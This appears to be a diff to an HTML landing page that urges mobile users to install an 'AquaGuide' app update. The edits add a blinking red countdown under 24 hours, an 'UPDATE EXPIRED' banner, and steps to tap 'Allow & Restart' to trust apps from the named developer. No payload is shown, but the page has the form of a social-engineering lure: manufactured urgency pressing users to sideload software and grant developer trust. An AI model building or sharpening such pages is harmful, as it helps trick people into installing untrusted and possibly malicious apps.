@@ -35,8 +35,18 @@
         #timer {
             font-weight: 800;
             color: #f9f406;
-            font-size: 18px;
+            font-size: 20px;
             letter-spacing: 1px;
+            transition: color 0.5s ease;
+        }
+
+        .timer-urgent {
+            color: #ff4d4d !important;
+            animation: blinker 1s linear infinite;
+        }
+
+        @keyframes blinker {
+            50% { opacity: 0.5; }
         }
 
         /* High-Visibility Pulsing Button */
@@ -119,7 +129,12 @@
                             <li>Tap the <strong>'GET UPDATE!'</strong> button below.</li>
                             <li>Tap <strong>'Install'</strong> when the prompt appears.</li>
                             <li>The app will close to update (wait 10-15 seconds).</li>
-                            <li>If prompted: <em>"Allow Apps from Aqua-Aerobic Systems, Inc.?"</em> <br> <strong>- Tap "Allow & Restart"</strong></li>
+                            <li>
+                                Find and open the updated 'AquaGuide' app.<br>
+                                <img src="updated.png" style="width: 80px; margin: 10px 0; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);"><br>
+                                <small><i>(The blue dot denotes recent update!)</i></small>
+                            </li>
+                            <li style="margin-top: 10px;">If prompted: <em>"Allow Apps from Aqua-Aerobic Systems, Inc.?"</em> <br> <strong>- Tap "Allow & Restart"</strong></li>
                         </ol>
 
                         <div style="margin: 25px 0;">
@@ -170,6 +185,7 @@
     <script>
         // Countdown Timer Logic
         const deadline = new Date("April 6, 2026 23:59:59").getTime();
+        const timerElement = document.getElementById("timer");
 
         const x = setInterval(function() {
             const now = new Date().getTime();
@@ -179,11 +195,16 @@
             const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
             const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
 
-            document.getElementById("timer").innerHTML = days + "d " + hours + "h " + minutes + "m ";
+            timerElement.innerHTML = days + "d " + hours + "h " + minutes + "m ";
+
+            // Urgent styling if under 24 hours
+            if (distance < (1000 * 60 * 60 * 24)) {
+                timerElement.classList.add("timer-urgent");
+            }
 
             if (distance < 0) {
                 clearInterval(x);
-                document.getElementById("countdown-container").innerHTML = "<div id='timer'>UPDATE EXPIRED</div>";
+                document.getElementById("countdown-container").innerHTML = "<div id='timer' class='timer-urgent'>UPDATE EXPIRED</div>";
             }
         }, 1000);
     </script>
